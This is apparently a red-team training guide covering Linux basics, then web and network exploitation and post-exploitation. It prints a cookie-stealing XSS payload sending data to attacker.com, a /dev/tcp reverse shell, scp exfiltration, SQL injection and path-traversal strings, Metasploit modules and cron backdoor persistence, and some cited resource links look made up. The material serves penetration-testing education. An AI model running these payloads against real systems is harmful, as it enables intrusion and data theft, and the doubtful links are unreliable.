## 2. Linux Basics

Linux is a widely used operating system known for its security, flexibility, and open-source nature. Understanding the fundamentals of Linux is essential for effective red teaming on Linux systems. In this section, we will cover key topics that will provide you with a solid foundation for your penetration testing activities.

### 2.1 File System Structure

The Linux file system follows a hierarchical structure, organized as a tree-like directory structure. Understanding the key directories and their purpose is important for navigating and managing the system effectively.

**Root Directory (/):** The root directory is the top-level directory in the file system hierarchy. It contains all other directories and files. It is represented by a forward slash (/) and serves as the starting point for absolute path references. For example, /home/user1 refers to the "user1" directory within the "home" directory.

**Binaries Directory (/bin):** The /bin directory contains essential user binaries. It houses common command-line tools that are essential for system operation and are available to all users. Some examples of binaries found in this directory are ls (used for listing directory contents), cp (used for copying files), mv (used for moving or renaming files), and cat (used for displaying file contents).

**Configuration Directory (/etc):** The /etc directory stores system configuration files. It holds various configuration files related to the system and its components. These files include network settings, user authentication mechanisms, application-specific configurations, and more. Examples of files found in this directory are passwd (user account information), hosts (mapping of IP addresses to hostnames), and ssh/sshd_config (SSH server configuration).

**Home Directory (/home):** The /home directory contains user home directories. Each user on the system is assigned a separate directory within /home, where they can store their personal files, documents, and settings. For example, if the username is "user1," their home directory would be /home/user1. This directory provides a designated space for users to manage their files and personalize their environment.

**Temporary Files Directory (/tmp):** The /tmp directory is used for temporary file storage. It provides a location for programs and users to store temporary files that are only needed during the current session. The contents of this directory are not preserved across system reboots and are generally cleared on startup. Due to its permissive file permissions (typically 1777 or "sticky bit" set), which allow anyone to create, modify, and delete files within it, /tmp can be an attractive directory from which to launch escalation tactics and store malicious scripts or tools.

**Variable Data Directory (/var):** The /var directory holds variable data. It stores files that change frequently during system operation. This directory includes log files, temporary files, databases, spool directories for printing and mail, and other data that may dynamically increase or decrease in size. For example, log files located in /var/log capture system events and activities, aiding in troubleshooting and auditing.

By understanding the purpose and organization of these key directories, red teamers can effectively navigate the file system, locate important files and configurations, and identify potential areas of interest during a penetration test.

It's important to note that the provided examples and explanations are not exhaustive, and there are other directories and subdirectories within the Linux file system that may be relevant in specific scenarios.

### 2.2 Permissions

Understanding file and directory permissions is crucial for assessing the security of Linux systems. Linux uses a permission model that restricts access to files and directories based on user, group, and others. The permissions determine what actions can be performed on a file or directory, such as reading, writing, or executing.

Linux employs three types of permissions:

* **Read \(r\):** Allows reading and viewing the contents of a file or directory.
* **Write (w):** Allows modifying or deleting a file, as well as creating, deleting, or renaming files within a directory.
* **Execute (x):** Allows executing or running a file as a program or script. For directories, it enables accessing and traversing the directory.

The permissions are assigned to three categories: user, group, and others. The user refers to the owner of the file or directory, the group represents a set of users, and others encompass everyone else.

Permissions can be represented using numerical notation, which consists of three digits. Each digit corresponds to user, group, and others, respectively, and the values assigned to them are as follows:

* **0:** No permissions.
* **1:** Execute permission.
* **2:** Write permission.
* **3:** Write and execute permissions.
* **4:** Read permission.
* **5:** Read and execute permissions.
* **6:** Read and write permissions.
* **7:** Read, write, and execute permissions.

For example, the permissions "777" grant read, write, and execute permissions to the user, group, and others, indicating full access to the file or directory. In contrast, the permissions "644" provide read and write permissions to the user and read-only permissions to the group and others.

To manage permissions, several commands are commonly used:

*
**chmod:** The chmod command is used to change the permissions of files and directories. It allows you to add or remove permissions for the user, group, and others. The permissions can be specified in numeric or symbolic notation. Numeric notation represents permissions using three digits, where each digit corresponds to user, group, and others, respectively. For example, "chmod 644 file.txt" sets read and write permissions for the user and read-only permissions for the group and others. Symbolic notation utilizes letters (u, g, o) for user, group, and others, along with operators (+, -, =) to add, remove, or set specific permissions. For example, "chmod u+x [script.sh](http://script.sh)" adds execute permissions for the user.
*
**chown:** The chown command changes the ownership of files and directories. It allows you to change the user and group ownership. For example, "chown user1:group1 file.txt" assigns the user "user1" and the group "group1" as the owners of file.txt.
*
**chgrp:** The chgrp command changes the group ownership of files and directories. It allows you to assign files and directories to different groups. For example, "chgrp group2 file.txt" changes the group ownership of file.txt to "group2."

Understanding and properly managing permissions is crucial to protect sensitive files, restrict access to unauthorized users, and prevent privilege escalation. During a penetration test, analyzing and exploiting incorrect permissions can help identify security weaknesses and gain unauthorized access to critical files or directories.

In addition to the basic permissions, Linux also supports special permissions, such as the sticky bit and setuid/setgid. The sticky bit, represented as "t" in the permission field, is commonly set on directories like /tmp. When set, it allows only the owner of a file to delete or rename it within the directory. This special permission is relevant to red team activities as /tmp, with its permissive file permissions (typically 1777 or "sticky bit" set), can be an attractive directory from which to launch escalation tactics and store malicious scripts or tools.

It's important to note that proper permission management should be practiced to maintain the security and integrity of the system, and unauthorized changes to permissions should not be made without proper authorization.

By understanding permissions and their implications, red teamers can identify misconfigurations, exploit vulnerabilities, and escalate privileges during a penetration test.

### 2.3 Processes

Processes are fundamental to Linux systems, and as a red teamer, understanding how to manage and interact with processes is essential. Processes are instances of executing programs or commands that are running on the system. They can be system processes or user processes, each serving different purposes.

Here are some important commands related to process management:

**ps:** The `ps` command displays information about active processes running on the system. By default, it provides a snapshot of processes associated with the current terminal session. Commonly used options include:


`ps aux`: Displays a comprehensive list of all running processes on the system, including details such as process ID (PID), CPU and memory usage, user, command, and more.
**Use case scenario:** During a red team exercise, you can use `ps aux` to identify processes running with elevated privileges or those associated with critical system components. Look for processes that are running as root or with unusual names or paths.
**Example command and output:

```
$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.2 169528 11596 ?        Ss   May20   0:05 /sbin/init
root         2  0.0  0.0      0     0 ?        S    May20   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   May20   0:00 [rcu_gp]
...
user1      1234  0.2  1.5 312824 76832 ?        S    May20   2:10 /usr/bin/application
...
```

In the above example, the `ps aux` command provides a detailed list of running processes, including information about the user, PID, CPU and memory usage, and the command being executed. This output allows red teamers to identify processes with high resource consumption or those running with elevated privileges.

**Additional options and variations:**

`ps -ef`: Provides a similar output to `ps aux`, but uses a different format to display the process information.
`ps -e --forest`: Displays a hierarchical view of processes, showing their parent-child relationships.
`ps -o pid,ppid,user,%cpu,%mem,cmd`: Customizes the output format to show specific columns like PID, parent PID, user, CPU and memory usage, and command.
`ps -U user1`: Shows processes owned by a specific user, such as "user1."

**kill:** The `kill` command allows you to terminate running processes. By specifying the process ID (PID) or the process name, you can send different signals to control the behavior of the process. Some common signals used with the `kill` command include:

`SIGTERM` (signal 15): Terminates the process gracefully, allowing it to perform any necessary cleanup operations before exiting.

**Use case scenario:** Suppose you have gained unauthorized access to a system during a red team engagement and want to cover your tracks by terminating a specific process. You can use `kill` with the appropriate PID and the `SIGTERM` signal to gracefully terminate the process and make it appear as a normal system shutdown.

**Example command:**

```
$ kill 1234
```

In the above example, the `kill` command is used with the PID `1234` to send the `SIGTERM` signal to the process, requesting it to terminate gracefully. The process will perform any necessary cleanup operations before exiting, making it less suspicious compared to a sudden termination.

* `SIGKILL` (signal 9): Forces the termination of the process without allowing it to perform any cleanup operations. This signal should be used as a last resort when a process is unresponsive or cannot be terminated gracefully.

**Use case scenario:** During a red team exercise, you may encounter a process that is unresponsive or refuses to terminate gracefully. In such cases, using the `SIGKILL` signal with the `kill` command can forcefully terminate the process, ensuring it is stopped regardless of its current state.

**Example command:**

```
$ kill -9 5678
```

In the above example, the `kill` command is used with the PID `5678` and the `SIGKILL` signal to forcefully terminate the process. This signal does not allow the process to perform any cleanup operations, making it useful when dealing with stubborn or malicious processes.

* **top:** The `top` command provides real-time monitoring of system activity and resource usage. It presents a dynamic view of running processes, CPU usage, memory consumption, and other system metrics. The information is continuously updated, allowing you to observe changes in resource usage over time. `top` is particularly useful for identifying resource-intensive processes, tracking down performance bottlenecks, and troubleshooting issues.

**Use case scenario:** During a red team exercise, you can use `top` to identify processes consuming excessive CPU or memory resources. Look for processes that may indicate suspicious or malicious activities, such as a high CPU usage by a process that shouldn't normally be resource-intensive.

**Example command:**

```
$ top
```

The `top` command provides an interactive view of the system's current processes and resource usage. It continuously updates the information, allowing you to monitor the system in real-time. By analyzing the CPU usage, memory consumption, and other system metrics, you can identify resource-intensive processes that may require further investigation during a red team engagement.

Example output:

```
top - 12:34:56 up 1 day, 3:45, 2 users, load average: 0.72, 0.86, 0.91
Tasks: 123 total,   1 running, 122 sleeping,   0 stopped,   0 zombie
%CPU(s): 23.4 us,  5.2 sy,  0.0 ni, 71.4 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :  16000.0 total,   6000.0 free,   8000.0 used,   2000.0 buff/cache
MiB Swap:   2000.0 total,   1500.0 free,    500.0 used.   9000.0 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND
 1234 user1     20   0  123456  78910  12345 R  50.0  0.5   0:01.23 suspicious_process
 5678 user2     20   0  234567  90123  23456 S  10.0  0.6   0:45.67 normal_process
```

In the above example, the `top` command provides a snapshot of the system's processes and resource usage. The output includes information such as the PID, user, CPU usage (%CPU), memory consumption (%MEM), and command name (COMMAND). By observing the CPU usage and looking for unusual or resource-intensive processes, red teamers can identify potential indicators of compromise or suspicious activities during an engagement.

Understanding and effectively utilizing the `top` command allows red teamers to monitor system activity, track resource usage, and identify processes that may require further investigation. By keeping a watchful eye on CPU

* **pstree:** The `pstree` command displays a hierarchical tree structure of processes, showing their relationships and dependencies. It provides a visual representation of the process hierarchy, making it easier to understand the parent-child relationships between processes.

**Use case scenario:** During a red team engagement, you can use `pstree` to analyze the process tree and identify critical processes that are essential for system operation. Look for processes that have parent processes with elevated privileges or those that are responsible for key system functions.

**Example command:**

```
$ pstree
```

The `pstree` command generates a tree-like structure of processes, highlighting their relationships. By examining the process tree, you can identify the parent-child relationships and understand how processes are connected to each other.

Example output:

```
systemd&#x2500;&#x252C;&#x2500;systemd-journal
        &#x251C;&#x2500;systemd-logind
        &#x251C;&#x2500;systemd-resolve
        &#x251C;&#x2500;systemd-udevd
        &#x251C;&#x2500;2*[agetty]
        &#x251C;&#x2500;cron
        &#x251C;&#x2500;dbus-daemon
        &#x251C;&#x2500;networkd-dispat
        &#x251C;&#x2500;sshd&#x2500;&#x252C;&#x2500;sshd&#x2500;&#x2500;&#x2500;sshd&#x2500;&#x2500;&#x2500;bash&#x2500;&#x2500;&#x2500;pstree
        &#x2502;      &#x2514;&#x2500;sshd&#x2500;&#x2500;&#x2500;sshd&#x2500;&#x2500;&#x2500;bash
        &#x251C;&#x2500;systemd&#x2500;&#x252C;&#x2500;(sd-pam)
        &#x2502;         &#x2514;&#x2500;(sd-pam)
        &#x2514;&#x2500;systemd&#x2500;&#x252C;&#x2500;systemd
                  &#x251C;&#x2500;systemd&#x2500;&#x252C;&#x2500;systemd-network
                  &#x2502;         &#x251C;&#x2500;systemd-resolv
                  &#x2502;         &#x2514;&#x2500;{systemd}
                  &#x2514;&#x2500;{systemd}
```

In the above example, the `pstree` command visualizes the process hierarchy. Each process is represented as a node in the tree, with its child processes indented below it. By examining the tree structure, red teamers can identify critical processes, such as the SSH server (`sshd`), and understand their dependencies on other processes.

* **pgrep:** The `pgrep` command allows you to search for processes based on their names or other attributes and retrieve their process IDs (PIDs). It provides a convenient way to find specific processes without needing to manually search through the process list.

**Use case scenario:** During a red team engagement, you can use `pgrep` to search for processes associated with specific services or applications that might be potential targets for exploitation. For example, you can search for processes related to a vulnerable web server or database service.

**Example command:**

```
$ pgrep apache2
```

The `pgrep` command searches for processes with the specified name or attributes and returns their PIDs. By using `pgrep` with specific search patterns, red teamers can quickly identify relevant processes for further analysis or exploitation.

Example output:

```
1234
5678
```

In the above example, the `pgrep` command searches for processes with the name "apache2" and returns their PIDs. The output includes the PIDs of the processes associated with the Apache web server. This information can be useful for further investigation or targeting specific processes during a red team exercise.

* **strace:** The `strace` command is used to trace and monitor system calls and signals made by a process. It provides detailed information about the interactions between a process and the operating system, including file operations, network communications, and signal handling.

**Use case scenario:** During a red team engagement, you can use `strace` to analyze the behavior of a suspicious or target process. By tracing its system calls, you can gain insights into its activities, such as file access, network connections, or potential vulnerabilities.

**Example command:**

```
$ strace -p 1234
```

The `strace` command attaches to an existing process specified by its PID and traces its system calls in real-time. By monitoring the system calls and their corresponding results, red teamers can gather valuable information about the inner workings of a process.

Example output:

```
strace: Process 1234 attached
open("/etc/passwd", O_RDONLY)        = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1876
close(3)                              = 0
...
```

In the above example, the `strace` command attaches to the process with PID 1234 and traces its system calls. The output shows the sequence of system calls made by the process, such as opening a file (`open`), reading from a file (`read`), and closing a file (`close`). By analyzing the system calls, red teamers can gain insights into the process's behavior and potentially uncover vulnerabilities or suspicious activities.

By utilizing these additional commands, red teamers can expand their process management capabilities and gain deeper insights into system activities during engagements. These commands provide valuable information for identifying critical processes, searching for specific processes, visualizing process hierarchies, and tracing system calls.

In addition to these commands, red teamers can also leverage specialized tools like **pspy** for enhanced process monitoring. Pspy is a powerful tool that allows you to monitor processes at the kernel level, providing insights into process execution, system calls, and other activities. It is typically used during an active red team engagement after the target system has been compromised and pspy has been successfully installed.

Pspy enables red teamers to observe processes and their interactions on the compromised system, potentially uncovering hidden activities or indicators of compromise that might go undetected by traditional monitoring tools.

When monitoring pspy's output during an active red team exercise, you should look for specific indicators that can help identify suspicious or malicious activities:

* **Unusual processes or commands:** Pay attention to any processes or commands that are executed or spawned on the system but are not part of normal operations. These could indicate unauthorized activities or the presence of malicious software.

Example output:

```
2023/05/25 13:30:01 CMD: UID=0    PID=1234    | /usr/bin/suspicious-command
```

* **Privilege escalation attempts:** Watch for attempts to execute commands with elevated privileges or access sensitive system files. These actions may indicate an adversary's attempt to escalate privileges and gain further control over the system.

Example output:

```
2023/05/25 13:30:03 OPEN: UID=1001    PID=5678    | /etc/passwd
```

* **File manipulation in critical directories:** Look for any creation or modification of files in critical directories, such as system directories or directories containing sensitive information. These activities may suggest attempts to establish persistence, perform unauthorized actions, or modify critical configuration files.

Example output:

```
2023/05/25 13:30:05 WRITE: UID=0    PID=9012    | /var/log/backdoor.log
```

* **Network connections or communication:** Monitor for network connections initiated by suspicious processes, which may indicate command-and-control (C2) activities or data exfiltration attempts.

Example output:

```
2023/05/25 13:30:07 ACCEPT: UID=1000    PID=3456    | 192.168.0.1:4444
```

Please note that using pspy assumes that the target system has already been compromised and pspy has been successfully installed. It is important to ensure proper authorization and adherence to legal and ethical guidelines when performing red team activities.

You can download pspy from the following links for the respective 32-bit and 64-bit versions:

* 32-bit version:[Download pspy (32-bit)](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32)
* 64-bit version:[Download pspy (64-bit)](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

After downloading pspy, transfer it to the compromised system and follow the appropriate steps to install and run it, depending on the specific target system and circumstances.

By incorporating pspy into their red teaming toolkit, security professionals can gain deeper insights into process activities at the kernel level, enabling them to detect and respond to potential threats more effectively within the compromised system.

### 2.4 Networking

Networking plays a vital role in red teaming, and understanding key networking concepts and tools is crucial for successful engagements. Here are some important commands for network-related tasks:

**ping:** The `ping` command is used to check network connectivity between the attacker machine and a target system. It sends ICMP echo requests to the target IP address or hostname and waits for ICMP echo replies. This helps verify if a host is reachable and provides an indication of the network latency. Example: `ping 192.168.1.1`.

**nc (netcat):** Netcat is a versatile networking utility that allows for establishing TCP or UDP connections, port scanning, and data transfer. It can be used for various tasks during a penetration test, including banner grabbing, port forwarding, creating reverse shells, and transferring files. Example: `nc -nv <target IP> <port>`.

**nmap:** Nmap is a powerful network scanning tool used for host discovery, service and operating system detection, and vulnerability scanning. It provides a wide range of scanning techniques and options to gather information about the target network. Some commonly used Nmap commands include:

  - `nmap -sn <target network>`: Performs a ping scan to discover live hosts in a network.
  - `nmap -sS <target>`: Performs a TCP SYN scan to identify open ports on a target system.
  - `nmap -A <target>`: Enables aggressive scanning, including OS detection, version detection, script scanning, and traceroute.

**iptables:** Iptables is a firewall management tool that allows for the configuration of packet filtering rules. It is used to control incoming and outgoing network traffic on a Linux system. Understanding how to configure firewall rules using iptables is crucial for assessing the security of network services and implementing appropriate network defenses.

Being proficient in networking concepts and tools allows for effective reconnaissance, vulnerability identification, and exploitation of target systems. These tools provide the foundation for understanding the network infrastructure, discovering vulnerabilities, and gaining unauthorized access during a red team engagement.

It's important to note that all network activities should be performed within the agreed rules of engagement and with proper authorization. Unauthorized scanning or exploitation of network systems is illegal and unethical. Always ensure that you have the necessary permission and legal authorization before conducting any network-related activities.

### 2.5 Command Line Basics

The command line interface (CLI) is the primary interface used in Linux systems. Familiarity with essential command line operations enhances productivity and efficiency during red team engagements. Here are some additional fundamental command line operations:

**Navigating Directories:**

  - `cd`: Use the `cd` command followed by a directory name to change to that directory. For example, `cd Documents` changes the current directory to the "Documents" directory.
  - `ls`: The `ls` command lists the contents of the current directory. Commonly used options include `-l` for a detailed listing, `-a` to show hidden files, and `-h` for human-readable file sizes.
  - `pwd`: The `pwd` command prints the current working directory, showing the full path of the current directory.

**File Operations:**

  - `cp`: The `cp` command is used to copy files and directories. For example, `cp file.txt /path/to/destination` copies the file "file.txt" to the specified destination.
  - `mv`: The `mv` command is used to move or rename files and directories. For example, `mv file.txt newname.txt` renames the file "file.txt" to "newname.txt".
  - `rm`: The `rm` command is used to remove files and directories. Use the `-r` option to remove directories recursively. Exercise caution when using `rm` to avoid unintentional data loss.

**File Manipulation:**

  - `cat`: The `cat` command is used to display the contents of a file. For example, `cat file.txt` shows the content of "file.txt" in the terminal.
  - `grep`: The `grep` command is used to search for specific patterns in files. For example, `grep "keyword" file.txt` searches for the word "keyword" in the file "file.txt".
  - Text Editors:

    + `nano`: Nano is a simple and user-friendly text editor. Use `nano` followed by the filename to open a file for editing.
    + `vim`: Vim is a powerful and highly customizable text editor. Use `vim` followed by the filename to open a file for editing.

**Archiving and Compression:**

  - `tar`: The `tar` command is used to create and extract archives. Common options include `-c` to create an archive, `-x` to extract files from an archive, and `-f` to specify the archive file name.
  - `gzip` and `gunzip`: `gzip` is used to compress files, while `gunzip` is used to decompress compressed files. For example, `gzip file.txt` compresses "file.txt" into "file.txt.gz".

Mastering these command line operations allows for efficient navigation, file manipulation, and basic text editing during red team engagements. These skills enable effective exploration and exploitation of target systems.

## 5. Exploitation

Exploitation is a critical phase in red team engagements, where vulnerabilities are leveraged to gain unauthorized access or control over a target system. This section explores various techniques and tools for achieving exploitation.

### 5.1 Web Application Exploitation

Web applications often present a significant attack surface and can be exploited through various techniques. Attackers leverage vulnerabilities in web applications to gain unauthorized access, steal sensitive information, or execute arbitrary commands. It is crucial to understand these techniques to identify and mitigate potential vulnerabilities. Here are some common and creative ways to achieve web application exploitation:

**5.1.1 SQL Injection:**

SQL injection is a technique where malicious SQL statements are inserted into an application's database query, allowing unauthorized access to the database or execution of arbitrary commands. By manipulating input fields that interact with the application's database, an attacker can modify the SQL queries to achieve unintended behavior.

Example: Consider a login form vulnerable to SQL injection:

vbnet

```
Username: admin<span class="hljs-comment">' OR '1'='1</span>
Password: any_password
```

In this example, the attacker enters a username that ends the existing query with `OR '1'='1`, which always evaluates to true. As a result, the application may grant access to the attacker, bypassing the authentication process.

Online Resource: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

**5.1.2 Cross-Site Scripting (XSS):**

Cross-Site Scripting (XSS) involves injecting malicious scripts into web pages viewed by other users, enabling attackers to steal sensitive information or perform actions on behalf of the victim. XSS vulnerabilities typically occur when untrusted user input is not properly sanitized or validated before being displayed on a web page.

Example: Injecting a script that steals user cookies:

html

```
<span class="hljs-tag"><<span class="hljs-title">script</span>></span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">'http://attacker.com/steal.php?cookie='</span>+<span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag"></<span class="hljs-title">script</span>></span>
```

When this script is executed by a victim's browser, it sends the user's cookies to the attacker's server, potentially compromising the victim's session.

Online Resource: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

**5.1.3 File Inclusion Exploitation:**

File inclusion vulnerabilities allow an attacker to include arbitrary files on a server, leading to unauthorized access, remote code execution, or sensitive information disclosure. These vulnerabilities typically occur when an application includes files based on user-supplied input without proper validation or sanitization.

Example: Exploiting a local file inclusion vulnerability to read sensitive files:

bash

```
http://target.com/?page=../../../../etc/passwd
```

In this example, the attacker manipulates the `page` parameter by traversing directory structures to access the `/etc/passwd` file, which contains sensitive system information.

Online Resource: [OWASP Local File Inclusion Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Inclusion_Prevention_Cheat_Sheet.html)

Understanding these web application exploitation techniques helps in identifying and securing vulnerabilities in web applications. It is crucial to implement secure coding practices, input validation, and output encoding to mitigate these vulnerabilities and ensure the overall security of web applications.

### 5.2 Network Exploitation

Network exploitation involves leveraging vulnerabilities in network services and protocols to gain unauthorized access or control over a target system. Attackers exploit weaknesses in network configurations, protocols, or services to compromise systems and extract sensitive information. Understanding these techniques is essential for identifying and securing potential vulnerabilities. Here are some common and creative ways to achieve network exploitation:

**5.2.1 Remote Code Execution (RCE):**

Remote Code Execution (RCE) vulnerabilities allow an attacker to execute arbitrary code on a target system remotely. These vulnerabilities often occur due to security flaws in web applications or network services. By exploiting RCE vulnerabilities, attackers can gain unauthorized access and control over a targeted system.

Example: Exploiting an RCE vulnerability in a vulnerable version of Apache Struts:

ruby

```
<span class="hljs-variable">$ </span>curl -<span class="hljs-constant">X</span> <span class="hljs-constant">POST</span> -d <span class="hljs-string">'command=whoami'</span> <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/target.com/struts</span>_vuln.action
```

In this example, the attacker sends a crafted request containing a command to execute arbitrary code on the target system through a vulnerable Apache Struts application.

Online Resource: [Metasploit Unleashed - Exploit Development](https://www.metasploitunleashed.com/Exploit_Development)

**5.2.2 Exploiting Weak Network Services:**

Weak network services, such as outdated versions of SSH, FTP, or SMB, can be exploited using known vulnerabilities or brute-force attacks. Attackers target these services to gain unauthorized access to systems or extract sensitive data.

Example: Exploiting a vulnerable version of FTP with Metasploit:

arduino

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target_ip
run
```

In this example, the attacker utilizes a specific exploit module in Metasploit to target a known vulnerability in a vulnerable FTP service, gaining unauthorized access to the target system.

Online Resource: [Metasploit Framework Documentation](https://www.metasploitunleashed.com/Documentation)

**5.2.3 Man-in-the-Middle (MitM) Attacks:**

Man-in-the-Middle (MitM) attacks involve intercepting and altering network traffic between a target system and its intended destination. Attackers can capture sensitive information, inject malicious content, or manipulate communication between systems.

Example: Performing a MitM attack using Ettercap:

bash

```
ettercap -T -q -M arp:remote /target_ip/ /gateway_ip/
```

In this example, the attacker uses Ettercap, a network interception tool, to perform an ARP poisoning attack. This allows the attacker to redirect traffic between the target system and the gateway, enabling the interception and manipulation of network communication.

Online Resource: [Bettercap Documentation](https://www.bettercap.org/docs/)

Understanding network exploitation techniques helps in identifying and mitigating vulnerabilities in network services and configurations. Implementing strong security measures, keeping network services up to date, and monitoring network traffic can help protect against these types of attacks.

### 5.3 Post-Exploitation Techniques

Once exploitation is achieved, post-exploitation techniques come into play. These techniques enable red teamers to maintain access, gather additional information, and escalate privileges within the compromised system. Post-exploitation is a critical phase that allows for deeper exploration and control of the target environment. Here are some common post-exploitation techniques:

**5.3.1 Privilege Escalation:**

Privilege escalation involves elevating user privileges on a compromised system to gain administrative or root access. By escalating privileges, attackers can overcome limitations and gain higher levels of control over the compromised system. This enables them to access sensitive data, execute additional commands, and manipulate the system.

Example: Checking for common privilege escalation vulnerabilities using LinEnum:

shell

```
$ ./LinEnum.sh -e /tmp/output
```

In this example, the attacker utilizes the LinEnum script to identify potential privilege escalation vulnerabilities in the compromised system. LinEnum provides an automated approach to gather information about the system's configuration, processes, and user permissions.

Online Resource: [GTFOBins - GTFO Techniques](https://gtfobins.github.io/)

**5.3.2 Lateral Movement:**

Lateral movement refers to the process of expanding access within a network by compromising additional systems. Once a foothold is gained, attackers leverage techniques like pass-the-hash, lateral exploitation, or pivoting to move laterally across the network. This enables them to explore and compromise other systems within the network environment.

Example: Using Metasploit's `psexec` module for lateral movement:

arduino

```
msfconsole
use exploit/windows/smb/psexec
set RHOST target_ip
set SMBUser username
set SMBPass password
run
```

In this example, the attacker utilizes Metasploit's `psexec` module to exploit a vulnerability in the SMB service and gain unauthorized access to a remote Windows system. This technique allows the attacker to execute commands on the compromised system and potentially move laterally within the network.

Online Resource: [Metasploit Unleashed - Pivoting](https://www.metasploitunleashed.com/Networking)

**5.3.3 Data Exfiltration:**

Data exfiltration involves transferring sensitive data from a compromised system to an attacker-controlled location. Attackers employ various techniques such as covert channels, encrypted tunnels, or steganography to conceal and transmit the data. Data exfiltration can occur through network channels, removable media, or even through manipulating legitimate communication channels.

Example: Exfiltrating data using the `scp` command:

typescript

```
$ scp sensitive_file.txt <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a8c9dcdcc9cbc3cddae8cdd0c9c5d8c4cd86cbc7c5">[email&#xA0;protected]</a>:<span class="hljs-regexp">/path/</span>on/attacker/server
```

In this example, the attacker uses the `scp` command to securely copy a sensitive file from the compromised system to an attacker-controlled server. The file is transferred over an encrypted SSH connection, minimizing the chances of detection.

Online Resource: [OWASP Data Exfiltration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Data_Exfiltration_Cheat_Sheet.html)

By utilizing these post-exploitation techniques, red teamers can maximize their impact and achieve their penetration testing objectives. It is crucial to understand these techniques to ensure the identification of vulnerabilities, the exploration of compromised systems, and the assessment of potential risks.

## 6. Post-Exploitation

Post-exploitation is a crucial phase in red team engagements, where the focus shifts from gaining initial access to maintaining control, gathering information, and escalating privileges within the compromised system. This section explores various post-exploitation techniques and best practices.

### 6.1 Maintaining Access

Maintaining access is a critical aspect of post-exploitation activities. It ensures persistence within a compromised system, allowing attackers to retain control and access even after the initial exploitation. Here are some common techniques used to maintain access:

**6.1.1 Backdoors and Shells:**

Deploying backdoors or shells provides remote access to the compromised system, enabling attackers to regain control and execute commands at a later time. These backdoors or shells can be created using various tools and techniques, such as reverse shells or web shells.

Example: Generating a reverse shell using Netcat:

javascript

```
Attacker: nc -nvlp <span class="hljs-number">4444</span>
Target: <span class="hljs-regexp">/bin/</span>bash -i >& <span class="hljs-regexp">/dev/</span>tcp/attacker_ip/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>>&<span class="hljs-number">1</span>
```

In this example, the attacker sets up a Netcat listener on the specified IP address and port. The target system executes a command that establishes a reverse shell connection to the attacker's machine. This allows the attacker to interact with the compromised system remotely.

Online Resource: [Penetration Testing Execution Standard (PTES) - Post Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)

**6.1.2 Persistence Mechanisms:**

Establishing persistence mechanisms ensures that the compromised system retains the ability to be accessed even after reboots or system updates. Attackers employ various techniques to achieve persistence, such as modifying startup scripts, creating scheduled tasks, or leveraging rootkits. These mechanisms ensure that the attacker can regain access to the compromised system automatically.

Example: Adding a persistent cron job:

sql

```
$ crontab -e
Add the following line:
@reboot /usr/local/bin/backdoor.sh
```

In this example, the attacker modifies the cron table to include a command that executes a backdoor script upon system reboot. The backdoor script will be automatically launched each time the system starts up, ensuring persistent access for the attacker.

Online Resource: [OWASP Web Application Security Testing Cheat Sheet - Backdoors and Command Injection](https://cheatsheetseries.owasp.org/cheatsheets/Backdoors_and_Command_Injection_Cheat_Sheet.html)

By implementing these techniques, attackers can maintain their presence within a compromised system, allowing for continued control, data exfiltration, and further exploration of the target environment. It is important for security professionals to be aware of these techniques to detect and mitigate unauthorized access effectively.

### 6.2 Information Gathering

Information gathering post-exploitation helps attackers gain a deeper understanding of the compromised system and the overall network. By collecting detailed information about the system and network infrastructure, attackers can identify valuable data, potential vulnerabilities, and avenues for further exploration. Here are some techniques and tools for gathering information:

**6.2.1 System Enumeration:**

System enumeration involves collecting detailed information about the compromised system, including the operating system version, running processes, installed applications, and network configuration. This information helps attackers understand the system's environment and potential vulnerabilities.

Example: Gathering system information using the `systeminfo` command on Windows:

makefile

```
C:\> systeminfo
```

In this example, the attacker executes the `systeminfo` command on a compromised Windows system to retrieve detailed information about the system's configuration.

Online Resource: [Windows Command Line - System Information](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo)

**6.2.2 Network Enumeration:**

Network enumeration focuses on gathering information about the network infrastructure, including IP addresses, active hosts, network shares, and user accounts. This information helps attackers identify potential targets, network services, and possible avenues for lateral movement.

Example: Enumerating network information using the `ifconfig` and `arp` commands on Linux:

ruby

```
<span class="hljs-variable">$ </span>ifconfig
<span class="hljs-variable">$ </span>arp -a
```

In this example, the attacker uses the `ifconfig` command to view network interface information and the `arp` command to list ARP entries and associated IP addresses.

Online Resource: [Linux Command Line - Network Commands](https://linuxize.com/post/linux-networking-commands/)

**6.2.3 File System Exploration:**

Exploring the compromised system's file system helps attackers identify valuable data, configuration files, log files, and potential areas for further exploration or privilege escalation. This information can be leveraged to gain access to sensitive information or escalate privileges within the system.

Example: Listing files and directories using the `ls` command on Linux:

shell

```
$ ls -l
```

In this example, the attacker uses the `ls` command with the `-l` option to list files and directories in a detailed format, providing information about permissions, ownership, file size, and modification time.

Online Resource: [Linux Command Line - File and Directory Operations](https://linuxize.com/post/linux-ls-command/)

**6.2.4 LinPEAS (Linux Privilege Escalation Audit Script):**

LinPEAS is a widely used tool for performing privilege escalation audits on Linux systems. It automates the process of gathering information about the compromised system and helps identify potential privilege escalation vectors.

Example: Running LinPEAS script on a compromised Linux system:

shell

```
$ ./linpeas.sh
```

